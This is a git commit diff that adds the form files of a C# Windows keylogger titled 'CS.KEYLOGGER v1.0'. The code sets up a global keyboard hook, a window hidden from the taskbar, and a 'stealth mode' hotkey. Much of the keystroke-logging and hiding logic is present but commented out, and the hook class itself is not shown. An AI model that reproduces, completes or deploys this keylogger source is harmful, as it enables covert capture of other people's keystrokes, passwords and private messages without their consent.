20b03a5d3702242857bbdcad6c9f166972bc3b79
Arsslen Idadi <arsslens021@gmail.com>
2019-08-27 11:02:27 +0100

    initial

---
+++ KeyLogger/frmMain.Designer.cs
@@ -0,0 +1,100 @@
+﻿using System.Windows.Forms;
+namespace GIGHook
+{
+    partial class FrmMain
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label1 = new System.Windows.Forms.Label();
+            this.buttonStop = new System.Windows.Forms.Button();
+            this.buttonStart = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.DodgerBlue;
+            this.label1.Location = new System.Drawing.Point(10, 49);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(316, 13);
+            this.label1.TabIndex = 15;
+            this.label1.Text = "Hotkey to return from stealth mode : Ctrl+Alt+Shift + (F12,F11,F10)";
+            // 
+            // buttonStop
+            // 
+            this.buttonStop.Image = global::GIGHook.Properties.Resources.DeleteRed;
+            this.buttonStop.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.buttonStop.Location = new System.Drawing.Point(180, 12);
+            this.buttonStop.Name = "buttonStop";
+            this.buttonStop.Size = new System.Drawing.Size(155, 34);
+            this.buttonStop.TabIndex = 5;
+            this.buttonStop.Text = "Stop";
+            this.buttonStop.Click += new System.EventHandler(this.ButtonStopClick);
+            // 
+            // buttonStart
+            // 
+            this.buttonStart.Image = global::GIGHook.Properties.Resources.Begin;
+            this.buttonStart.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.buttonStart.Location = new System.Drawing.Point(13, 12);
+            this.buttonStart.Name = "buttonStart";
+            this.buttonStart.Size = new System.Drawing.Size(155, 34);
+            this.buttonStart.TabIndex = 4;
+            this.buttonStart.Text = "Start";
+            this.buttonStart.Click += new System.EventHandler(this.ButtonStartClick);
+            // 
+            // FrmMain
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
+            this.ClientSize = new System.Drawing.Size(349, 76);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.buttonStop);
+            this.Controls.Add(this.buttonStart);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "FrmMain";
+            this.RightToLeftLayout = true;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "[CS.KEYLOGGER v1.0] ";
+            this.TopMost = true;
+            this.Load += new System.EventHandler(this.MainFormLoad);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button buttonStop;
+        private System.Windows.Forms.Button buttonStart;
+        private Label label1;
+
+    }
+}
+
---
+++ KeyLogger/frmMain.cs
@@ -0,0 +1,140 @@
+﻿using System;
+using System.Collections;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace GIGHook
+{
+    public partial class FrmMain : Form
+    {
+
+        private UserActivityHook _hooker;
+        public FrmMain()
+        {
+            InitializeComponent();
+         
+        }
+       private void ButtonStartClick(object sender, EventArgs e)
+        {
+            if (!_hooker.IsActive)
+                _hooker.Start(false,true);
+
+        }
+
+        private void ButtonStopClick(object sender, EventArgs e)
+        {
+            if (_hooker.IsActive)
+                _hooker.Stop();
+              
+        }
+
+        private void MainFormLoad(object sender, EventArgs e)
+        {
+            _hooker = new UserActivityHook(false,true);
+            _hooker.KeyDown += HookerKeyDown;
+            _hooker.KeyPress += HookerKeyPress;
+            _hooker.KeyUp += HookerKeyUp;
+            _hooker.Stop();
+        }
+        public void MouseMoved(object sender, MouseEventArgs e)
+        {
+            //labelMousePosition.Text = String.Format("X:{0},Y={1},Wheel:{2}", e.X, e.Y, e.Delta);
+            //if (e.Clicks <= 0) return;
+            //txt_MouseLog.AppendText("MouseButton:" + e.Button);
+            //txt_MouseLog.AppendText(Environment.NewLine);
+        }
+
+        public void HookerKeyDown(object sender, KeyEventArgs e)
+        {
+            this.Text = e.KeyData.ToString();
+            //if (e.KeyData.ToString() == "Return")
+            //    Logger("[Enter]");
+            //if (e.KeyData.ToString() == "Escape")
+            //    Logger("[Escape]");
+            ////Logger(e.KeyData + Environment.NewLine);
+            //switch (e.KeyData.ToString())
+            //{
+            //    case "RMenu":
+            //    case "LMenu":
+            //        _isAltDown = true;
+            //        break;
+            //    case "RControlKey":
+            //    case "LControlKey":
+            //        _isControlDown = true;
+            //        break;
+            //    case "LShiftKey":
+            //    case "RShiftKey":
+            //        _isShiftDown = true;
+            //        break;
+            //    case "F10":
+            //    case "F11":
+            //    case "F12":
+            //        _isFsDown = true;
+            //        break;
+            //}
+
+            //if (_isAltDown && _isControlDown && _isShiftDown && _isFsDown)
+            //    if (_isHide)
+            //    {
+            //        Show();
+            //        _isHide = false;
+            //    }
+            //    else
+            //    {
+            //        Hide();
+            //        _isHide = true;
+            //    }
+        }
+
+        public void HookerKeyPress(object sender, KeyPressEventArgs e)
+        {
+            //_allowtoTik = true;
+            //if ((byte) e.KeyChar == 9)
+            //    Logger("[TAB]");
+            //else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
+            //    Logger(e.KeyChar.ToString());
+            //else if (e.KeyChar == 32)
+            //    Logger(" ");
+            //else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
+            //    Logger("[Char\\" + ((byte) e.KeyChar) + "]");
+
+            //_tik = 0;
+        }
+
+        public void HookerKeyUp(object sender, KeyEventArgs e)
+        {
+            ////Logger("KeyUP : " + e.KeyData.ToString() + Environment.NewLine);
+            //switch (e.KeyData.ToString())
+            //{
+            //    case "RMenu":
+            //    case "LMenu":
+            //        _isAltDown = false;
+            //        break;
+            //    case "RControlKey":
+            //    case "LControlKey":
+            //        _isControlDown = false;
+            //        break;
+            //    case "LShiftKey":
+            //    case "RShiftKey":
+            //        _isShiftDown = false;
+            //        break;
+            //    case "F10":
+            //    case "F11":
+            //    case "F12":
+            //        _isFsDown = false;
+            //        break;
+            //}
+        }
+
+        private void btn_Exit_Click(object sender, EventArgs e)
+        {
+
+        }
+
+    
+    }
+}
